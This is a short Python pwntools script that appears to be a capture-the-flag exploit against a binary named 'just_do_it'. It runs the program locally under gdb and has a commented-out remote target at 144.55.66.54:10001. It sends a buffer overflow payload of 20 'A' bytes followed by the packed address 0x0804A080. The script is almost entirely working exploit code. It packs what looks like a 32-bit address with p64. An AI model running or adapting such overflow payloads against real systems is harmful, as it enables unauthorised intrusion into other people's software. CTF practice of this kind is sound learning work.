from pwn import *
context.log_level = "Debug"
io = process("./just_do_it") 
gdb.attach(io)
#io = remote('144.55.66.54', 10001)
				
payload = 'A'*20
payload += p64(0x0804A080)
io.sendline(payload)
io.recvall()
